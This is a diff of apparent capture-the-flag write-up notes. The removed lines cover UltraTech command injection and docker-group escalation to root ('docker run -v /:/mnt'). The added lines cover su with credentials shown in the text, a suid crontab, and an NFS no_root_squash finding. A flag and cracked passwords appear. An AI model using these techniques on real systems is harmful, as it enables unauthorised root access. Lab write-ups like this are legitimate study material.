@@ -64,31 +64,54 @@ paradox:ShibesAreGreat123\
 0day:OllieIsTheBestDog\
 muirlandoracle:A11D0gsAreAw3s0me
 
-if we visit the /utech_sitemap.txt
+
+with this account, i access to ftp paradox:ShibesAreGreat123
+
 ```bash
-/
-/index.html
-/what.html
-/partners.html
+root:x:0:0:root:/root:/bin/bash
+james:x:1000:1000:James:/home/james:/bin/bash
+paradox:x:1001:1001::/home/paradox:/bin/bash
 ```
 
-we exploit the ping API with using the ``` ` ``` char that is interpreted as bash and not filtered\
-we do a reverse shell
-
-we found a file 
-we crack the password of r00t that is : n100906
-
-finally we found that r00t user is in docker group so we can privesc
-```sh
-r00t@ultratech-prod:~$ groups
-r00t docker
-r00t@ultratech-prod:~$ docker images
-REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
-bash                latest              495d6437fc1e        4 years ago         15.8MB
-```
-
-and we are finally root on docker, we can access filesystem by browsing to /mnt
+we can use the previously found credentials of paradox to do a su and become paradox : paradox:ShibesAreGreat123
 ```bash
-r00t@ultratech-prod:~$ docker run -v /:/mnt -it bash
-bash-5.0#
+bash-4.4$ su paradox
+Password: 
+[paradox@localhost /]$
 ```
+
+we see there is /usr/bin/crontab with suid bit\
+we'll try to add a job executed by root
+
+
+/home/paradox/.local/bin:/home/paradox/bin:/home/paradox/.local/bin:/home/paradox/bin:/usr/local/bin:/usr/bin
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+
+pspy64
+
+
+tcp     LISTEN   0        128              0.0.0.0:111            0.0.0.0:*                                                                                  
+tcp     LISTEN   0        128              0.0.0.0:20048          0.0.0.0:*     
+tcp     LISTEN   0        64               0.0.0.0:43221          0.0.0.0:*     
+tcp     LISTEN   0        128              0.0.0.0:22             0.0.0.0:*     
+tcp     LISTEN   0        128              0.0.0.0:51255          0.0.0.0:*     
+tcp     LISTEN   0        64               0.0.0.0:2049           0.0.0.0:*     
+tcp     LISTEN   0        64                  [::]:43563             [::]:*     
+tcp     LISTEN   0        128                 [::]:111               [::]:*     
+tcp     LISTEN   0        128                 [::]:20048             [::]:*     
+tcp     LISTEN   0        128                    *:80                   *:*     
+tcp     LISTEN   0        128                 [::]:58355             [::]:*     
+tcp     LISTEN   0        32                     *:21                   *:*     
+tcp     LISTEN   0        128                 [::]:22                [::]:*     
+tcp     LISTEN   0        64                  [::]:2049              [::]:*
+
+
+╔══════════╣ Analyzing NFS Exports Files (limit 70)
+Connected NFS Mounts:                                                                                                                                        
+nfsd /proc/fs/nfsd nfsd rw,relatime 0 0
+sunrpc /var/lib/nfs/rpc_pipefs rpc_pipefs rw,relatime 0 0
+-rw-r--r--. 1 root root 54 Nov 18  2020 /etc/exports
+/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
+
+
+thm{3693fc86661faa21f16ac9508a43e1ae}
